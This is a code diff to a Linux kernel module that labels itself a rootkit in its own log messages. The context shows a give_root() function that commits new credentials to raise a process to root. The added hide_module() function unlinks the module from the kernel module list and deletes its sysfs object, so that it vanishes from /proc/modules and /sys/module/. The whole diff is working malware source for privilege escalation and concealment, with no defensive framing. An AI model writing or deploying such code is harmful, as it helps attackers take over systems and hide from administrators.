@@ -2,6 +2,9 @@
 
 #include "inc/macro_utils.h"
 #include <linux/cred.h>
+#include <linux/export.h>
+#include <linux/kobject.h>
+#include <linux/list.h>
 #include <linux/printk.h>
 
 
@@ -32,4 +35,15 @@ void give_root(const pid_t i32_pid, const int i32_sig)
     commit_creds(p_creds);
 
     pr_info("[ROOTKIT] * Process is now root\n");
+}
+
+void hide_module(void)
+{
+    // Remove module from /proc/modules
+    list_del(&THIS_MODULE->list);
+
+    // Remove module from /sys/module/
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+
+    pr_info("[ROOTKIT] Module was hidden from /proc/modules and /sys/module/\n");
 }
